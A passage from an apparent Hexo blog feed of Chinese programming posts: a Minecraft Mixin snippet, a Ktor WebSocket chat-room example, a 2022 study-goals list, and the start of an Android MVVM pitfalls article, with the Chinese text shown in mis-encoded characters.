class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>widget<span class="token punctuation">.</span>button<span class="token punctuation">.</span></span><span class="token class-name">OptionButton</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span>injection<span class="token punctuation">.</span></span><span class="token class-name">At</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span>injection<span class="token punctuation">.</span></span><span class="token class-name">Inject</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span>injection<span class="token punctuation">.</span>callback<span class="token punctuation">.</span></span><span class="token class-name">CallbackInfoReturnable</span><span class="token punctuation">;</span><span class="token comment">/** * FSB * me.skymc.fsb.mixin.MixinScreenLanguage * * @author åé»‘ * @since 2021/12/29 10:54 PM */</span><span class="token annotation punctuation">@Mixin</span><span class="token punctuation">(</span><span class="token class-name">Screen</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MixinLanguageScreen</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Inject</span><span class="token punctuation">(</span>method <span class="token operator">=</span> <span class="token string">"addButton"</span><span class="token punctuation">,</span> at <span class="token operator">=</span> <span class="token annotation punctuation">@At</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"HEAD"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cancellable <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token keyword">protected</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span> <span class="token keyword">extends</span> <span class="token class-name">Widget</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">void</span> <span class="token function">addButton</span><span class="token punctuation">(</span><span class="token class-name">T</span> p_230480_1_<span class="token punctuation">,</span> <span class="token class-name">CallbackInfoReturnable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p_230480_1_ <span class="token keyword">instanceof</span> <span class="token class-name">OptionButton</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">OptionButton</span><span class="token punctuation">)</span> p_230480_1_<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">AbstractOption</span><span class="token punctuation">.</span>FORCE_UNICODE_FONT<span class="token punctuation">)</span> <span class="token punctuation">{</span>            c<span class="token punctuation">.</span><span class="token function">setReturnValue</span><span class="token punctuation">(</span>p_230480_1_<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
            <tag> Forgeæ¨¡ç»„å¼€å‘ </tag>
            
            <tag> å­—èŠ‚ç æ“ä½œ </tag>
            
            <tag> Mixin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Ktor!</title>
      <link href="/2022/09/03/hello-ktor/"/>
      <url>/2022/09/03/hello-ktor/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Ktor"><a href="#Hello-Ktor" class="headerlink" title="Hello Ktor!"></a>Hello Ktor!</h1><blockquote><p>Ktoræ˜¯JetBrainså®˜æ–¹å›¢é˜Ÿå¼€å‘çš„ä¸€æ¬¾åŸºäºKotlinè¯­è¨€çš„åç«¯æ¡†æ¶</p><p>ä¸åŒäºSpring Bootç‰ºç‰²æ€§èƒ½æ¢å–å¼€å‘æ•ˆç‡çš„åšæ³•ï¼Œåœ¨Kotlinè¯­è¨€ä¼˜ç¾çš„DSLè¯­æ³•ä¸åç¨‹ç‰¹æ€§çš„åŠ æŒä¸‹ï¼ŒKtorå…¼é¡¾äº†å¹¶å‘æ€§èƒ½ä¸å¼€å‘æ•ˆç‡</p><p>æ›´ä¸ºé‡è¦çš„æ˜¯ï¼Œä½œä¸ºä¸€åä½¿ç”¨Kotlinè¯­è¨€è¿›è¡Œå¼€å‘çš„Androidå¼€å‘è€…ï¼ŒåŒæ ·ä½¿ç”¨å¤§é‡Kotlinè¯­è¨€é«˜çº§ç‰¹æ€§ä¸åç¨‹çš„Ktorå±å®æ˜¯æˆ‘ä»¬èµ°å‘å…¨æ ˆä¹‹è·¯çš„ä¸äºŒæ³•é—¨å‘¢</p></blockquote><p>å…¶å®æ¥è§¦è¿™ä¸ªä¸»è¦æ˜¯å› ä¸ºæˆ‘ç”¨Spring Bootå†™çš„é‚£ä¸ªWebSocketæ— è®ºå¦‚ä½•éƒ½æ²¡æ³•ç”¨OKHttpè¿ä¸Šï¼ˆæµè§ˆå™¨å°±å¯ä»¥ï¼‰</p><p>ä¸å¤šåºŸè¯ï¼Œç›´æ¥è´´ä»£ç ï¼Œæ„Ÿå—ä¸€ä¸‹Kotlin DSLçš„ä¼˜é›…ç®€æ´</p><p><strong>Sockets.kt</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> logger <span class="token operator">=</span> LogManager<span class="token punctuation">.</span><span class="token function">getLogManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">"ChatRoom"</span><span class="token punctuation">)</span><span class="token keyword">val</span> gson<span class="token operator">:</span> Gson <span class="token operator">=</span> <span class="token function">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">fun</span> Application<span class="token punctuation">.</span><span class="token function">configureSockets</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">install</span><span class="token punctuation">(</span>WebSockets<span class="token punctuation">)</span> <span class="token punctuation">{</span>        pingPeriod <span class="token operator">=</span> Duration<span class="token punctuation">.</span><span class="token function">ofSeconds</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>        timeout <span class="token operator">=</span> Duration<span class="token punctuation">.</span><span class="token function">ofSeconds</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>        maxFrameSize <span class="token operator">=</span> Long<span class="token punctuation">.</span>MAX_VALUE        masking <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span>    routing <span class="token punctuation">{</span>        <span class="token keyword">val</span> connections <span class="token operator">=</span> Collections<span class="token punctuation">.</span>synchronizedSet<span class="token operator">&lt;</span>Connection<span class="token operator">?</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token function">LinkedHashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">webSocket</span><span class="token punctuation">(</span><span class="token string">"/chatroom"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// websocketSession</span>            <span class="token keyword">val</span> thisConnection <span class="token operator">=</span> <span class="token function">Connection</span><span class="token punctuation">(</span>                <span class="token keyword">this</span><span class="token punctuation">,</span>                call<span class="token punctuation">.</span>request<span class="token punctuation">.</span>queryParameters<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"nameless"</span><span class="token punctuation">,</span>                call<span class="token punctuation">.</span>request<span class="token punctuation">.</span>queryParameters<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span>                    <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>            <span class="token punctuation">)</span>            connections <span class="token operator">+=</span> thisConnection            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>name<span class="token delimiter variable">}</span></span> join with avatar: <span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>avatar<span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>            connections<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>                it<span class="token punctuation">.</span>session<span class="token punctuation">.</span>outgoing<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>                    Frame<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span>                        gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>                            <span class="token function">ChatMessageBean</span><span class="token punctuation">(</span>                                <span class="token string">"OPEN"</span><span class="token punctuation">,</span>                                thisConnection<span class="token punctuation">.</span>name<span class="token punctuation">,</span>                                <span class="token keyword">null</span><span class="token punctuation">,</span>                                thisConnection<span class="token punctuation">.</span>avatar                            <span class="token punctuation">)</span>                        <span class="token punctuation">)</span>                    <span class="token punctuation">)</span>                <span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>frame <span class="token keyword">in</span> incoming<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">when</span> <span class="token punctuation">(</span>frame<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">is</span> Frame<span class="token punctuation">.</span>Text <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>                            <span class="token keyword">val</span> text <span class="token operator">=</span> frame<span class="token punctuation">.</span><span class="token function">readText</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>name<span class="token delimiter variable">}</span></span> chat with avatar: <span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>avatar<span class="token delimiter variable">}</span></span> : <span class="token interpolation variable">$text</span>"</span><span class="token punctuation">)</span>                            connections<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>                                it<span class="token punctuation">.</span>session<span class="token punctuation">.</span>outgoing<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>                                    Frame<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span>                                        gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>                                            <span class="token function">ChatMessageBean</span><span class="token punctuation">(</span>                                                <span class="token string">"MESSAGE"</span><span class="token punctuation">,</span>                                                thisConnection<span class="token punctuation">.</span>name<span class="token punctuation">,</span>                                                text<span class="token punctuation">,</span>                                                thisConnection<span class="token punctuation">.</span>avatar                                            <span class="token punctuation">)</span>                                        <span class="token punctuation">)</span>                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>  <span class="token keyword">catch</span> <span class="token punctuation">(</span>t<span class="token operator">:</span> Throwable<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>localizedMessage<span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>                connections <span class="token operator">-=</span> thisConnection                <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>name<span class="token delimiter variable">}</span></span> exit with avatar: <span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>avatar<span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ChatMessageBean</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">data</span> <span class="token keyword">class</span> <span class="token function">ChatMessageBean</span><span class="token punctuation">(</span>    <span class="token keyword">val</span> type<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> username<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>    <span class="token keyword">val</span> avatar<span class="token operator">:</span> String<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Connection</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">Connection</span><span class="token punctuation">(</span><span class="token keyword">val</span> session<span class="token operator">:</span> DefaultWebSocketSession<span class="token punctuation">,</span> <span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> avatar<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">companion</span> <span class="token keyword">object</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> lastId <span class="token operator">=</span> <span class="token function">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Ktor </tag>
            
            <tag> åç«¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022ä¸‹åŠå¹´ç›®æ ‡&amp;é¡¹ç›®&amp;å­¦ä¹ æ–¹å‘&amp;æ€»ç»“</title>
      <link href="/2022/09/03/goals-of-the-second-half-of-2022/"/>
      <url>/2022/09/03/goals-of-the-second-half-of-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="2022ä¸‹åŠå¹´ç›®æ ‡-amp-é¡¹ç›®-amp-å­¦ä¹ æ–¹å‘-amp-æ€»ç»“"><a href="#2022ä¸‹åŠå¹´ç›®æ ‡-amp-é¡¹ç›®-amp-å­¦ä¹ æ–¹å‘-amp-æ€»ç»“" class="headerlink" title="2022ä¸‹åŠå¹´ç›®æ ‡&amp;é¡¹ç›®&amp;å­¦ä¹ æ–¹å‘&amp;æ€»ç»“"></a>2022ä¸‹åŠå¹´ç›®æ ‡&amp;é¡¹ç›®&amp;å­¦ä¹ æ–¹å‘&amp;æ€»ç»“</h1><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><blockquote><p>æ€»ä¹‹å°½å¯èƒ½çš„å¤šå®Œæˆå‡ ä¸ªå§</p></blockquote><ul><li><input disabled="" type="checkbox"> å°†æˆ‘çš„è½»è–„æœ¬ç³»ç»Ÿåˆ·æˆManjaro Linux Gnome (åœ¨é‚£ä¹‹å‰å…ˆæ¢ä¸€å¼ é˜³é—´ä¸€ç‚¹çš„æ— çº¿ç½‘å¡)</li><li><input disabled="" type="checkbox"> å­¦Android frameworkå±‚æºç ï¼Œè‡³å°‘è¦å­¦åˆ°ä¸€ä¸ªè‡ªå·±è§‰å¾—ç›¸å¯¹æ»¡æ„çš„ä½ç½®</li><li><input disabled="" type="checkbox"> å­¦Linuxå†…æ ¸ï¼ŒåŒä¸Š</li><li><input disabled="" type="checkbox"> ç»™è‡ªå·±æ‰‹æœºåˆ·ä¸ŠMagiskï¼Œè¿˜å¯ä»¥ç”¨LSPosedç©ä¸€äº›hookçš„éªšæ“ä½œ</li><li><input disabled="" type="checkbox"> ä¸è¦æŒ‚ç§‘</li><li><input disabled="" type="checkbox"> äº«å—è‡ªå·±çš„å¤§å­¦ç”Ÿæ´»</li></ul><h2 id="é¡¹ç›®"><a href="#é¡¹ç›®" class="headerlink" title="é¡¹ç›®"></a>é¡¹ç›®</h2><ul><li><input disabled="" type="checkbox"> EmoticonC<ul><li>ç±»ä¼¼Hall of fameçš„è¡¨æƒ…åŒ…ç®¡ç†Appï¼Œä¸è¿‡ç®¡ç†çš„æ˜¯Telegramçš„è¡¨æƒ…åŒ…ï¼Œæ”¯æŒä¸€é”®å‘é€åˆ°qq/å¾®ä¿¡/é£ä¹¦</li><li>åç«¯ä½¿ç”¨Golangå¼€å‘</li></ul></li><li><input disabled="" type="checkbox"> MiraiQQ<ul><li>ä¸€ä¸ªMirai Consoleçš„Androidå¹³å°ä¸‹çš„å‰ç«¯å®ç°ï¼Œä¸”å…·æœ‰QQå®¢æˆ·ç«¯çš„åŠŸèƒ½</li><li>ç•Œé¢å°½å¯èƒ½ç®€çº¦ï¼Œä½“ç§¯å°½å¯èƒ½å°</li><li>å¯ä»¥åŠ è½½Miraiæ’ä»¶ï¼Œè‡ªå¸¦Rhinoå¼•æ“æ¥åŠ è½½Jsæ’ä»¶</li></ul></li></ul><h2 id="å­¦ä¹ æ–¹å‘"><a href="#å­¦ä¹ æ–¹å‘" class="headerlink" title="å­¦ä¹ æ–¹å‘"></a>å­¦ä¹ æ–¹å‘</h2><ul><li>ä¸»è¦æ–¹å‘<ul><li>Android framework</li><li>æŸäº›æ—é—¨å·¦é“(å­—èŠ‚ç æ’æ¡©ï¼Œæ³¨è§£å¤„ç†ï¼Œhook)</li><li>Linux æ“ä½œ/å†…æ ¸/åº”ç”¨å¼€å‘</li></ul></li><li>å…´è¶£ä½¿ç„¶çš„æ¬¡è¦æ–¹å‘<ul><li>Golang web</li><li>Rust</li><li>Machine Learning</li></ul></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><blockquote><p>ä»Šå¹´ç»“æŸæˆ‘ä¼šæ¥è¡¥ä¸Šçš„</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ€»ç»“è§„åˆ’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MMVMä¸ƒå®—ç½ª</title>
      <link href="/2022/09/03/guilty-of-mvvm/"/>
      <url>/2022/09/03/guilty-of-mvvm/</url>
      
        <content type="html"><![CDATA[<h1 id="MVVMä¸ƒå®—ç½ª"><a href="#MVVMä¸ƒå®—ç½ª" class="headerlink" title="MVVMä¸ƒå®—ç½ª"></a>MVVMä¸ƒå®—ç½ª</h1><h2 id="å…¶ä¸€-æ‹¿Fragmentå½“LifecycleOwner"><a href="#å…¶ä¸€-æ‹¿Fragmentå½“LifecycleOwner" class="headerlink" title="å…¶ä¸€ æ‹¿Fragmentå½“LifecycleOwner"></a>å…¶ä¸€ æ‹¿Fragmentå½“LifecycleOwner</h2><p>Livedataä¹‹æ‰€ä»¥å¯ä»¥é˜²æ­¢æ³„éœ²ï¼Œæ˜¯å› ä¸ºå®ƒæ‰€æŒæœ‰çš„lifecycleownerèµ°åˆ°<code>DESTORYED</code>æ—¶å°±ä¼šè‡ªåŠ¨å–æ¶ˆæ‰€æœ‰è®¢é˜…ã€‚</p><p>ç„¶è€ŒFragmentåœ¨æŸäº›æƒ…å†µä¸‹å¹¶ä¸ä¼šé”€æ¯ï¼Œç”±äºåˆ›å»ºä¸€ä¸ªFragmentä»£ä»·é«˜æ˜‚ï¼Œåœ¨Fragmentçš„è·³è½¬è¿‡ç¨‹ä¸­ï¼Œå¦‚æœä½¿ç”¨è¿”å›æ ˆï¼Œåœ¨è¿”å›è¿™ä¸ªfragmentæ—¶å¹¶ä¸ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„fragmentï¼Œè€Œæ˜¯ä¼šå¤ç”¨è€çš„Fragmentï¼Œä¹Ÿå°±æ˜¯Fragmentçš„ç”Ÿå‘½å‘¨æœŸæ­¤æ—¶è¿˜æœªç»“æŸï¼Œä½†åœ¨ä¹‹å‰ç¦»å¼€è¿™ä¸ªfragmentæ—¶ï¼Œè¿™ä¸ªfragmentä¸­çš„viewç¡®å®å·²ç»æ‘§æ¯äº†ã€‚ä¸€èˆ¬æˆ‘ä»¬æ¯”è¾ƒé€šå¸¸çš„å†™æ³•æ˜¯åœ¨<code>onViewCreated</code>ä¸­è¿›è¡Œè§‚å¯Ÿï¼Œè€Œä¸æ˜¯åœ¨<code>onCreate</code>,ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨fragmentä¸­çš„viewçš„ç”Ÿå‘½å‘¨æœŸå¼€å§‹æ—¶æˆ‘ä»¬è®¢é˜…äº†ä¸€ä¸ªå¯è®¢é˜…çš„ä¸œè¥¿ï¼Œä½†å´åœ¨fragmentçš„ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶æ‰å–æ¶ˆè®¢é˜…ï¼Œè¿™å°±å¯¼è‡´äº†ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é€€å‡ºç•Œé¢æ—¶ï¼Œfragmentçš„viewç¡®å®å·²ç»é”€æ¯äº†ï¼Œä½†fragmentæ²¡æœ‰é”€æ¯ï¼Œäºæ˜¯å†æ¬¡è¿›å…¥fragmentåˆä¼šè°ƒç”¨ä¸€æ¬¡<code>onViewCreated</code>ï¼Œå°±ä¼šå¯¼è‡´æˆ‘ä»¬é‡å¤è®¢é˜…äº†ä¸¤æ¬¡ã€‚</p><p>è§£å†³æ–¹å¼å°±æ˜¯ä½¿ç”¨<code>viewLifecycleOwner</code>ï¼Œè¿™æ ·åœ¨viewè¢«é”€æ¯æ—¶å°±èƒ½å–æ¶ˆè®¢é˜…ã€‚</p><h2 id="å…¶äºŒ-åœ¨launchWhenXä¸­å¯ç”¨åç¨‹"><a href="#å…¶äºŒ-åœ¨launchWhenXä¸­å¯ç”¨åç¨‹" class="headerlink" title="å…¶äºŒ åœ¨launchWhenXä¸­å¯ç”¨åç¨‹"></a>å…¶äºŒ åœ¨launchWhenXä¸­å¯ç”¨åç¨‹</h2><h3 id="Flow-vs-LiveData"><a href="#Flow-vs-LiveData" class="headerlink" title="Flow vs. LiveData"></a>Flow vs. LiveData</h3><p>Flowæ€»ä½“ä¸Šçœ‹ç¡®å®åŠŸèƒ½æ¯”LiveDataè¦æ›´åŠ å¼ºå¤§ï¼Œä½†ç”±äºLiveDataæ˜¯android jetpackçš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ä¸“ä¸ºandroidè®¾è®¡çš„ï¼Œæ‰€ä»¥å®ƒåœ¨å®‰å“åº”ç”¨åœºæ™¯ä¸‹è‡³å°‘å¸¦æ¥äº†ä¸¤ä¸ªå¥½å¤„</p><ul><li>ç”Ÿå‘½å‘¨æœŸç®¡ç† - lifecycleOwnerè¿›å…¥destoryé˜¶æ®µæ—¶ï¼Œä¼šè‡ªåŠ¨å–æ¶ˆè®¢é˜…ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</li><li>èŠ‚çœèµ„æº - lifecycleOwneråœ¨è¿›å…¥STARTEDæ—¶æ‰ä¼šæ¥æ”¶æ•°æ®ï¼Œé¿å…åœ¨åå°çš„æ— æ•ˆè®¡ç®—</li></ul><p>å¦‚æœæƒ³ä½¿ç”¨Flowæ¥æ›¿ä»£LiveDataï¼Œé‚£ä¹ˆè‡³å°‘éœ€è¦åšåˆ°è¿™ä¸¤ç‚¹æ‰è¡Œ</p><p>ç¬¬ä¸€ç‚¹å…¶å®æ¯”è¾ƒå¥½å®ç°ï¼Œæˆ‘ä»¬å¾ˆå¤šæ—¶å€™è§‚å¯Ÿçš„Flowéƒ½æ˜¯ä¸€ä¸ªå†·æµï¼Œå†·æµçš„ç”Ÿå‘½å‘¨æœŸç”±è®¢é˜…å®ƒçš„CoroutineScopeå†³å®šã€‚è€Œå®˜æ–¹çš„<code>lifecycle-runtime-ktx</code>å·²ç»ä¸ºæˆ‘ä»¬çš„æ‰€æœ‰lifecycleOwneræ·»åŠ äº†ä¸€ä¸ª<code>lifecycleScope</code>ï¼Œåªè¦åœ¨lifecycleScopeå¯åŠ¨çš„åç¨‹ä¸­è®¢é˜…å°±èƒ½ä¿è¯ç¬¬ä¸€ç‚¹ï¼Œè€Œå³ä½¿æ˜¯çƒ­æµä¹Ÿä¼šè‡ªåŠ¨å–æ¶ˆè®¢é˜…ã€‚æˆ‘è®¤ä¸ºåœ¨è¿™æ–¹é¢Flowå–ä»£LiveDataæ˜¯åŸºæœ¬æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºåªè¦æ˜¯ä¸ªäººå°±èƒ½æƒ³åˆ°ä½¿ç”¨lifecycleScopeå¯åŠ¨åç¨‹è¿›è¡Œæµçš„æ”¶é›†ã€‚</p><p>é‚£ä¹ˆç¬¬äºŒç‚¹è¦å¦‚ä½•ä¿è¯å‘¢ï¼Ÿ</p><p>å¾ˆå¤šäººå°±ä¼šæƒ³åˆ°æ‰€è°“çš„<code>launchWhenX</code>ï¼Œå®ƒèƒ½è®©å¼€å¯çš„åç¨‹åœ¨<code>PAUSED</code>æ—¶æŒ‚èµ·ï¼Œåœ¨<code>STARTED</code>,<code>RESUMED</code>æ—¶æ¢å¤ï¼Œä¼¼ä¹çœ‹èµ·æ¥å¾ˆå®Œç¾ï¼Œå¯¹å—ï¼Ÿ</p><p>å¯æƒœçš„æ˜¯ï¼Œè¿™æ ·åšåªæŒ‚èµ·äº†ä¸‹æ¸¸æˆ‘ä»¬æ”¶é›†è¿™ä¸ªflowçš„åç¨‹ï¼Œè€Œä¸Šæ¸¸çš„æ•°æ®è¿˜åœ¨æŒç»­å‘é€ï¼Œå¦‚æœè¿™æ ·åšçš„è¯ï¼Œç¬¬äºŒç‚¹è§£å†³çš„å…¶å®å¾ˆä¸å½»åº•ã€‚</p><p>é‚£ä¹ˆï¼Œè§£å†³æ–¹æ³•æ˜¯ä»€ä¹ˆå‘¢</p><h3 id="repeatOnLifecycle"><a href="#repeatOnLifecycle" class="headerlink" title="repeatOnLifecycle"></a>repeatOnLifecycle</h3><blockquote><p>lifecycle-runtime-ktx è‡ª <code>2.4.0-alpha01</code> èµ·ï¼Œæä¾›äº†ä¸€ä¸ªæ–°çš„åç¨‹æ„é€ å™¨ <code>lifecyle.repeatOnLifecycle</code>ï¼Œ å®ƒåœ¨ç¦»å¼€ X çŠ¶æ€æ—¶é”€æ¯åç¨‹ï¼Œå†è¿›å…¥ X çŠ¶æ€æ—¶å†å¯åŠ¨åç¨‹ã€‚ä»å…¶å‘½åä¸Šä¹Ÿå¯ä»¥ç›´è§‚åœ°è®¤è¯†è¿™ä¸€ç‚¹ï¼Œå³<strong>å›´ç»•æŸç”Ÿå‘½å‘¨æœŸçš„è¿›å‡ºåå¤å¯åŠ¨æ–°åç¨‹</strong>ã€‚</p></blockquote><p>æ˜¯çš„ï¼Œä¸å†æ˜¯æŒ‚èµ·ï¼Œè€Œæ˜¯ç›´æ¥é”€æ¯ã€‚è¿™æ ·åšçš„è¯collectå°±ä¸æ˜¯è¢«æŒ‚èµ·ï¼Œè€Œæ˜¯ç›´æ¥è¢«å–æ¶ˆè®¢é˜…ï¼Œå¦‚æœæˆ‘ä»¬è¿™é‡Œè®¢é˜…çš„æ˜¯ä¸€ä¸ªå†·æµï¼Œé‚£ä¹ˆä¸Šæ¸¸å°±ä¼šè·Ÿç€è¢«å–æ¶ˆã€‚è¿™æ˜¯ä¸æ˜¯å°±å®Œç¾çš„è§£å†³äº†ç¬¬äºŒç‚¹ï¼Ÿ</p><p>åŒæ—¶ä¸€æ—¦ä½¿ç”¨è¿™ä¸ªæ–¹æ³•å¯åŠ¨çš„åç¨‹æ¥è®¢é˜…Flowï¼Œè¿™ä¸ªFlowå°±ä¹Ÿä¼šå…·æœ‰LiveDataçš„é‡è¦ç‰¹æ€§ä¹‹ä¸€: æ•°æ®å€’çŒã€‚è¿™æ 